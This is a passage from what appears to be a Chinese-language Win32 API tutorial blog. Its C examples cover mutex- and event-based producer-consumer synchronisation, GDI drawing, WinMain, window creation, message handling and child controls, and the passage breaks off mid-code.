<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.先创建一个互斥体</span><br><span class="line">2.创建两个线程</span><br><span class="line">3.在线程中等待互斥体</span><br><span class="line">4.互斥体锁线程后就能实现生产一次，消费一次</span><br><span class="line"></span><br><span class="line">但是，这样生产和消费的顺序可能搞反</span><br></pre></td></tr></table></figure>

<p>出现了先消费、后生产的情况：</p>
<p><img src="/2024/07/05/Win32API/image-20240306163350154.png" alt="image-20240306163350154"></p>
<p>因此可以加条件判断现在有没有产品：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE hEven;</span><br><span class="line">HANDLE hMutex;</span><br><span class="line"><span class="type">int</span> produce;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ProduceThread</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* pProduceCount = (<span class="type">int</span>*)lpParameter;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *pProduceCount; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		WaitForSingleObject(hMutex, INFINITE);</span><br><span class="line">		<span class="keyword">if</span> (produce == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			produce = <span class="number">1</span>;	<span class="comment">// 生产了一个产品</span></span><br><span class="line">			<span class="type">long</span> ProduceThreadID = GetCurrentThreadId();</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;生产者%ld生产了一个产品\n&quot;</span>, ProduceThreadID);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			i--;</span><br><span class="line">		&#125;</span><br><span class="line">		ReleaseMutex(hMutex);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ConsumptionThread</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* pProduceCount = (<span class="type">int</span>*)lpParameter;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *pProduceCount; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		WaitForSingleObject(hMutex, INFINITE);</span><br><span class="line">		<span class="keyword">if</span> (produce == <span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			produce = <span class="number">0</span>;	<span class="comment">// 消费了一个产品</span></span><br><span class="line">			<span class="type">long</span> ConsumptionThreadID = GetCurrentThreadId();</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;	消费者%ul消费了一个产品\n&quot;</span>, ConsumptionThreadID);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			i--;</span><br><span class="line">		&#125;</span><br><span class="line">		ReleaseMutex(hMutex);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> produceCount = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span>* pProduce = &amp;produceCount;</span><br><span class="line"></span><br><span class="line">	hMutex = CreateMutex(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);		<span class="comment">// 创建互斥体,起始状态为阻塞</span></span><br><span class="line"></span><br><span class="line">	HANDLE hPCThread[<span class="number">2</span>];</span><br><span class="line">	hPCThread[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ProduceThread, (LPTHREAD_START_ROUTINE)pProduce, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	hPCThread[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ConsumptionThread, (LPTHREAD_START_ROUTINE)pProduce, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	WaitForMultipleObjects(<span class="number">2</span>, hPCThread, TRUE, INFINITE);</span><br><span class="line">	CloseHandle(hPCThread[<span class="number">0</span>]);</span><br><span class="line">	CloseHandle(hPCThread[<span class="number">1</span>]);</span><br><span class="line">	CloseHandle(hMutex);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就可以实现先生产、后消费。</p>
<p>但是，如果在else{i–}这里查看到底浪费了多少次循环：</p>
<p><img src="/2024/07/05/Win32API/image-20240306171259764.png" alt="image-20240306171259764" style="zoom:50%;"><img src="/2024/07/05/Win32API/image-20240306171019818.png" alt="image-20240306171019818" style="zoom:40%;"></p>
<p>输出———的地方就是浪费的时间，占用了计算资源</p>
<h4 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h4><p>所以通过通知来优化这个程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 容器</span></span><br><span class="line"><span class="type">int</span> container = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 次数</span></span><br><span class="line"><span class="type">int</span> count = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 事件</span></span><br><span class="line">HANDLE eventA;</span><br><span class="line">HANDLE eventB;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生产者</span></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lpParameter)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="comment">// 等待事件，修改事件A状态</span></span><br><span class="line">        WaitForSingleObject(eventA, INFINITE);</span><br><span class="line">        <span class="comment">// 获取当前进程ID</span></span><br><span class="line">        <span class="type">int</span> threadId = GetCurrentThreadId();</span><br><span class="line">        <span class="comment">// 生产存放进容器</span></span><br><span class="line">        container = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thread: %d, Build: %d \n&quot;</span>, threadId, container);</span><br><span class="line">        <span class="comment">// 给eventB设置信号</span></span><br><span class="line">        SetEvent(eventB);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消费者</span></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProcB</span><span class="params">(LPVOID lpParameter)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="comment">// 等待事件，修改事件B状态</span></span><br><span class="line">        WaitForSingleObject(eventB, INFINITE);</span><br><span class="line">        <span class="comment">// 获取当前进程ID</span></span><br><span class="line">        <span class="type">int</span> threadId = GetCurrentThreadId();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thread: %d, Consume: %d \n&quot;</span>, threadId, container);</span><br><span class="line">        <span class="comment">// 消费</span></span><br><span class="line">        container = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 给eventA设置信号</span></span><br><span class="line">        SetEvent(eventA);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 创建事件</span></span><br><span class="line">    <span class="comment">// 线程同步的前提是互斥</span></span><br><span class="line">    <span class="comment">// 顺序按照先生产后消费，所以事件A设置信号，事件B需要通过生产者线程来设置信号</span></span><br><span class="line">    eventA = CreateEvent(<span class="literal">NULL</span>, FALSE, TRUE, <span class="literal">NULL</span>);</span><br><span class="line">    eventB = CreateEvent(<span class="literal">NULL</span>, FALSE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建2个线程</span></span><br><span class="line">    HANDLE hThread[<span class="number">2</span>];</span><br><span class="line">    hThread[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    hThread[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProcB, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    WaitForMultipleObjects(<span class="number">2</span>, hThread, TRUE, INFINITE);</span><br><span class="line">    CloseHandle(hThread[<span class="number">0</span>]);</span><br><span class="line">    CloseHandle(hThread[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">// 事件类型也是内核对象，所以也需要关闭句柄</span></span><br><span class="line">    CloseHandle(eventA);</span><br><span class="line">    CloseHandle(eventB);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样通过事件先让生产者执行，然后让生产者告诉消费者来消费，再由消费者告诉生产者生产的顺序执行，就合理利用了计算资源。</p>
<h2 id="窗口"><a href="#窗口" class="headerlink" title="窗口"></a>窗口</h2><h3 id="窗口的本质"><a href="#窗口的本质" class="headerlink" title="窗口的本质"></a>窗口的本质</h3><img src="/2024/07/05/Win32API/image-20240306185445689.png" alt="image-20240306185445689" style="zoom:50%;">

<p>ntoskrnl.exe和win32k.exe是系统提供的两个模块，kernel32.dll、user32.dl、gdi32.dll可以看成是接口</p>
<p>如果要使用user32.dll绘制窗口，就是GUI，使用gdi32.dll绘制窗口就是GDI。</p>
<p>在创建窗口中使用的句柄是<code>HWND</code>，这个句柄是全局句柄，是公有的。</p>
<h3 id="绘图"><a href="#绘图" class="headerlink" title="绘图"></a>绘图</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6031)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HWND hwnd;</span><br><span class="line">	HDC hdc;</span><br><span class="line">	HPEN hpen;</span><br><span class="line">	HBRUSH hbrush;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//1. 设备对象</span></span><br><span class="line">	hwnd = (HWND)<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2. 获取对象上下文</span></span><br><span class="line">	hdc = GetDC(hwnd);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//3. 创建画笔 设直线条属性</span></span><br><span class="line">	hpen = CreatePen(PS_SOLID, <span class="number">5</span>, RGB(<span class="number">0xff</span>, <span class="number">0x45</span>, <span class="number">0x10</span>));</span><br><span class="line">	hbrush = (HBRUSH)GetStockObject(DC_BRUSH);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//4. 关联 如果不关联，会仍然使用系统提供的画笔</span></span><br><span class="line">	SelectObject(hdc, hpen);</span><br><span class="line">	SetDCBrushColor(hdc, RGB(<span class="number">0xc0</span>, <span class="number">0x30</span>, <span class="number">0x00</span>));</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">//5. 画</span></span><br><span class="line">	LineTo(hdc, <span class="number">2560</span>, <span class="number">1600</span>);</span><br><span class="line">	Rectangle(hdc, <span class="number">200</span>, <span class="number">200</span>, <span class="number">600</span>, <span class="number">800</span>);</span><br><span class="line">	getchar();</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//6. 释放资源</span></span><br><span class="line">	DeleteObject(hpen);</span><br><span class="line">	ReleaseDC(hwnd, hdc);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/07/05/Win32API/image-20240306200851412.png" alt="image-20240306200851412" style="zoom:50%;">

<h2 id="Windows程序"><a href="#Windows程序" class="headerlink" title="Windows程序"></a>Windows程序</h2><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><img src="/2024/07/05/Win32API/image-20240306203415711.png" alt="image-20240306203415711" style="zoom:50%;">

<p>入口函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> APIENTRY <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, 		<span class="comment">//指向模块的句柄</span></span></span><br><span class="line"><span class="params">                     HINSTANCE hPrevInstance, 	<span class="comment">//永远为空</span></span></span><br><span class="line"><span class="params">                     PSTR szCmdLine, </span></span><br><span class="line"><span class="params">                     <span class="type">int</span> iCmdShow)</span>			   <span class="comment">//以最大化还是最小化还是隐藏等形式运行</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>窗口程序没有控制台打印输出，可以输出到调试里面</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> APIENTRY <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, <span class="type">int</span> iCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> szOutBuff[<span class="number">0x80</span>];</span><br><span class="line">	DWORD dwAddr = (DWORD)hInstance;</span><br><span class="line">	<span class="built_in">sprintf</span>(szOutBuff, <span class="string">&quot;Buff: %d\n&quot;</span>, dwAddr);</span><br><span class="line">	OutputDebugString(szOutBuff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/07/05/Win32API/image-20240307213505432.png" alt="image-20240307213505432" style="zoom:50%;">

<p>第一步，定义窗口是什么样的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:28251)</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> APIENTRY <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, <span class="type">int</span> iCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> szOutBuff[<span class="number">0x80</span>];</span><br><span class="line">	<span class="comment">// 1.第一步：定义窗口是什么样的</span></span><br><span class="line">	TCHAR className[] = TEXT(<span class="string">&quot;Window Application&quot;</span>);			<span class="comment">//创建一个字符串，存储窗口名称</span></span><br><span class="line">	WNDCLASS wndclass = &#123; <span class="number">0</span> &#125;;								<span class="comment">//使用WNDCLASS类定义一个窗体，创建一个对象并初始化</span></span><br><span class="line">	wndclass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;		<span class="comment">//窗口背景色-&gt;要转成画刷形式的</span></span><br><span class="line">	wndclass.lpszClassName = className;						<span class="comment">//窗口的名字</span></span><br><span class="line">	wndclass.hInstance = hInstance;							<span class="comment">//当前窗口属于哪个程序，就是属于本程序，所以把hInstance传进来</span></span><br><span class="line">	wndclass.lpfnWndProc = WindowProc;</span><br><span class="line">	RegisterClass(&amp;wndclass);										<span class="comment">//将刚才定义好的wndclass类告诉系统一声</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 2.第二步：创建并显示窗口、</span></span><br><span class="line">	HWND hwnd = CreateWindow(</span><br><span class="line">		className,							<span class="comment">//与上面定义的窗口关联</span></span><br><span class="line">		TEXT(<span class="string">&quot;My First Window&quot;</span>),			<span class="comment">//窗体名字</span></span><br><span class="line">		WS_OVERLAPPEDWINDOW,				<span class="comment">//窗体风格</span></span><br><span class="line">		<span class="number">200</span>,								<span class="comment">//相对于父窗口的x坐标</span></span><br><span class="line">		<span class="number">100</span>,								<span class="comment">//相对于父窗口的y坐标</span></span><br><span class="line">		<span class="number">600</span>,								<span class="comment">//窗体的宽度</span></span><br><span class="line">		<span class="number">400</span>,								<span class="comment">//窗体的高度	</span></span><br><span class="line">		<span class="literal">NULL</span>,								<span class="comment">//父窗口</span></span><br><span class="line">		<span class="literal">NULL</span>,								<span class="comment">//是否有菜单</span></span><br><span class="line">		hInstance,							<span class="comment">//当前窗口是属于哪个模块的</span></span><br><span class="line">		<span class="literal">NULL</span>								<span class="comment">//附加数据，先不管，填空</span></span><br><span class="line">		);</span><br><span class="line">	<span class="keyword">if</span> (hwnd == <span class="literal">NULL</span>)						<span class="comment">//创建失败就返回</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">sprintf</span>(szOutBuff, <span class="string">&quot;Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">		OutputDebugString(szOutBuff);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-10</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ShowWindow(hwnd,SW_SHOW);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 3.第三步：接收消息并处理</span></span><br><span class="line">	MSG msg;</span><br><span class="line">	BOOL bRet;</span><br><span class="line">	<span class="keyword">while</span> ((bRet = GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>)) != <span class="number">0</span>) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (bRet == <span class="number">-1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">sprintf</span>(szOutBuff, <span class="string">&quot;Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">			OutputDebugString(szOutBuff);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// 转换消息</span></span><br><span class="line">			TranslateMessage(&amp;msg);</span><br><span class="line">			<span class="comment">// 分发消息 为了调用消息处理函数将这个消息处理掉</span></span><br><span class="line">			DispatchMessage(&amp;msg);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//消息处理函数</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> DefWindowProc(hwnd, uMsg, wParam, lParam);<span class="comment">//调用一下默认的消息处理函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/05/Win32API/image-20240307224351324.png" alt="image-20240307224351324"></p>
<h3 id="消息处理"><a href="#消息处理" class="headerlink" title="消息处理"></a>消息处理</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//消息处理函数</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*char szOutBuff[0x80];</span></span><br><span class="line"><span class="comment">	sprintf(szOutBuff, &quot;消息类型: %d\n&quot;, GetLastError());</span></span><br><span class="line"><span class="comment">	OutputDebugString(szOutBuff);*/</span></span><br><span class="line">	<span class="keyword">switch</span> (uMsg)				<span class="comment">//想要的消息使用switch接收，其他的交给默认消息处理函数</span></span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">	&#123;</span><br><span class="line">		PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">case</span> WM_CHAR:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//MessageBox(0,TEXT(&quot;456&quot;),TEXT(&quot;123&quot;),MB_OK);</span></span><br><span class="line">		<span class="type">char</span> szOutBuff[<span class="number">0x80</span>];</span><br><span class="line">		<span class="built_in">sprintf</span>(szOutBuff, <span class="string">&quot;按键:%x - %x - %c\n&quot;</span>, uMsg, wParam, wParam);</span><br><span class="line">		OutputDebugString(szOutBuff);</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> DefWindowProc(hwnd, uMsg, wParam, lParam);<span class="comment">//调用默认的消息处理函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="子窗口控件"><a href="#子窗口控件" class="headerlink" title="子窗口控件"></a>子窗口控件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:28251)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_EDIT_1 0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_BUTTON_1 0x101</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_BUTTON_2 0x102</span></span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span>;</span><br><span class="line"></span><br><span class="line">HINSTANCE g_hInstance;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> APIENTRY <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, <span class="type">int</span> iCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line">    g_hInstance = hInstance;</span><br><span class="line">    <span class="type">char</span> szOutBuff[<span class="number">0x80</span>];</span><br><span class="line">    <span class="comment">// 1.第一步：定义窗口是什么样的</span></span><br><span class="line">    TCHAR className[] = TEXT(<span class="string">&quot;Window Application&quot;</span>);            <span class="comment">//创建一个字符串，存储窗口名称</span></span><br><span class="line">    WNDCLASS wndclass = &#123; <span class="number">0</span> &#125;;                                <span class="comment">//使用WNDCLASS类定义一个窗体，创建一个对象并初始化</span></span><br><span class="line">    wndclass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;        <span class="comment">//窗口背景色-&gt;要转成画刷形式的</span></span><br><span class="line">    wndclass.lpszClassName = className;                        <span class="comment">//窗口的名字</span></span><br><span class="line">    wndclass.hInstance = hInstance;                            <span class="comment">//当前窗口属于哪个程序，就是属于本程序，所以把hInstance传进来</span></span><br><span class="line">    wndclass.lpfnWndProc = WindowProc;</span><br><span class="line">    RegisterClass(&amp;wndclass);                                        <span class="comment">//将刚才定义好的wndclass类告诉系统一声</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2.第二步：创建并显示窗口、</span></span><br><span class="line">    HWND hwnd = CreateWindow(</span><br><span class="line">        className,                            <span class="comment">//与上面定义的窗口关联</span></span><br><span class="line">        TEXT(<span class="string">&quot;My First Window&quot;</span>),            <span class="comment">//窗体名字</span></span><br><span class="line">        WS_OVERLAPPEDWINDOW,                <span class="comment">//窗体风格</span></span><br><span class="line">        <span class="number">200</span>,                                <span class="comment">//相对于父窗口的x坐标</span></span><br><span class="line">        <span class="number">100</span>,                                <span class="comment">//相对于父窗口的y坐标</span></span><br><span class="line">        <span class="number">600</span>,                                <span class="comment">//窗体的宽度</span></span><br><span class="line">        <span class="number">400</span>,                                <span class="comment">//窗体的高度    </span></span><br><span class="line">        <span class="literal">NULL</span>,                                <span class="comment">//父窗口</span></span><br><span class="line">        <span class="literal">NULL</span>,                                <span class="comment">//是否有菜单</span></span><br><span class="line">        hInstance,                            <span class="comment">//当前窗口是属于哪个模块的</span></span><br><span class="line">        <span class="literal">NULL</span>                                <span class="comment">//附加数据，先不管，填空</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (hwnd == <span class="literal">NULL</span>)                        <span class="comment">//创建失败就返回</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(szOutBuff, <span class="string">&quot;Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        OutputDebugString(szOutBuff);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-10</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ShowWindow(hwnd, SW_SHOW);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.第三步：接收消息并处理</span></span><br><span class="line">    MSG msg;</span><br><span class="line">    BOOL bRet;</span><br><span class="line">    <span class="keyword">while</span> ((bRet = GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>)) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (bRet == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">sprintf</span>(szOutBuff, <span class="string">&quot;Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">            OutputDebugString(szOutBuff);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 转换消息</span></span><br><span class="line">            TranslateMessage(&amp;msg);</span><br><span class="line">            <span class="comment">// 分发消息 为了调用消息处理函数将这个消息处理掉</span></span><br><span class="line">            DispatchMessage(&amp;msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//消息处理函数</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WindowProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> szOutBuff[<span class="number">0x80</span>];</span><br><span class="line">    <span class="comment">/*sprintf(szOutBuff, &quot;消息类型: %d\n&quot;, GetLastError());</span></span><br><span class="line"><span class="comment">    OutputDebugString(szOutBuff);*/</span></span><br><span class="line">    <span class="keyword">switch</span> (uMsg)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">    &#123;</span><br><span class="line">        PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> WM_CREATE:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//当创建了父窗口开始画子窗口</span></span><br><span class="line">        CreateWindow(</span><br><span class="line">            TEXT(<span class="string">&quot;EDIT&quot;</span>),                        <span class="comment">// Windows就知道这是一个文本框</span></span><br><span class="line">            <span class="string">&quot;&quot;</span>,                            <span class="comment">//    文本框不需要标题，所以给空</span></span><br><span class="line">            WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE,        <span class="comment">// 保证子窗口创建出来的时候在上层可见</span></span><br><span class="line">            <span class="number">10</span>,</span><br><span class="line">            <span class="number">10</span>,</span><br><span class="line">            <span class="number">200</span>,</span><br><span class="line">            <span class="number">100</span>,</span><br><span class="line">            hwnd,</span><br><span class="line">            (HMENU)IDC_EDIT_1,                        <span class="comment">//将宏定义的ID转换为HMENU类型</span></span><br><span class="line">            g_hInstance,</span><br><span class="line">            <span class="literal">NULL</span></span><br><span class="line">        );</span><br><span class="line">        CreateWindow(</span><br><span class="line">            TEXT(<span class="string">&quot;BUTTON&quot;</span>),                        <span class="comment">// 按钮</span></span><br><span class="line">            